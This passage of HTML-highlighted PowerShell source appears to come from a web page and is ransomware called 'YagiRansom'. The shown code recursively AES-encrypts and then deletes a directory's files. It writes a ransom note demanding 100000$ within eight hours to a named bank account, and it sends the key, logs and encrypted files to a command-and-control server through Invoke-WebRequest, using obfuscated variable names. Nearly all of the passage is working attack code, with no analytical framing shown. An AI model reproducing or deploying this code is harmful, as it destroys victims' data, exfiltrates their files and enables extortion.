}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[0] -eq \"-f\") { \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = [Convert]::ToBase64String([IO.File]::ReadAllBytes(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">[1])) }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Split(\"=\")[0] ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Replace(\"C\", \"-\") ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.Replace(\"E\", \"_\")\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $8bKW\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$VaFQ\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.ToCharArray() ; [array]::Reverse(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$8bKW\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$R64Base\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = -join \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$8bKW\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; return \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$R64Base\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function GetStatus {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Try { Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/status\" -Method GET \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">      Write-Host \"[i] C2 Server is up!\" -ForegroundColor Green }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Catch { Write-Host \"[!] C2 Server is down!\" -ForegroundColor Red }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function SendResults {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $cvf\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = Invoke-AESEncryption -Key \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Uz19o\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -Text \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$WiETm\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$cVl\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -t \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$cvf\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $2YngY\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \"> \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$cVl\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$OgE\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$zVSza\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> > \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7VEq\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = Get-Content \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $XoX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -t \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$2YngY\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Logs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -t \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RansomLogs\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/data\" -Method POST -Body \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$XoX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/logs\" -Method POST -Body \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Logs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function SendClose {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/close\" -Method GET 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function SendPay {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/pay\" -Method GET 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function SendOK {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/done\" -Method GET 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function CreateReadme {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $I26TXT\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \"All your files have been encrypted by YagiRansom!!\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">But don't worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">To get decryption instructions, you must transfer 100000$ to the following account:\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">Account Name: Mat tran To quoc Viet Nam - Ban Cuu Tro Trung uong\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">Account Number: 0011.00.1932418\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">Bank: Vietnam Joint Stock Commercial Bank for Foreign Trade (Vietcombank)\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">`n\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\"\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (!(Test-Path \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\")) { Add-Content -Path \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" -Value \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$I26TXT\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function EncryptFiles { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $ExcludedFiles\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   foreach (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> in \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">$(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-ChildItem\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">recurse \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">exclude \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$ExcludedFiles\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> |\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Where-Object\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.PSIsContainer\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> ForEach-Object\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.FullName\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">)\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-AESEncryption -Key \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$WiETm\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -Path \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; Add-Content -Path \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" -Value \"[!] \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> is now encrypted\" ;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Remove-Item \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = Get-Content \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch ; if (!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RansomLogs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Add-Content -Path \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" -Value \"[!] No files have been encrypted!\" }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function ExfiltrateFiles {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files\" -Method GET 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RansomLogs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = Get-Content \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory$slash$I26\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" | Select-String \"No files have been encrypted!\" ; if (!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RansomLogs\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   foreach (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> in \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">$(\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">Get-ChildItem\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\"> $Directory\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\"> -\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">recurse \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">-\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">filter \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">*\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.enc \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> Where-Object\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">!\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> $_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.PSIsContainer\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> } \u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">|\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\"> ForEach-Object\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> { \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">.FullName\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }\u003C/span>\u003Cspan style=\"--shiki-light:#A0111F;--shiki-dark:#FF9492\">)\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">      $Pfile\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">.split(\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$slash\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">)[-1] ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -f \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$i\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> ; \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -t \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Pfile\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">      Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files/\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" -Method POST -Body \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   else { \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = R64Encoder -t \"none.null\" ; Invoke-WebRequest -useb \"\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$7CiB\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">`:\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$UFX\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">/files/\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64Name\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">\" -Method POST -Body \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$B64file\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 2>&#x26;1> \u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$null\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> 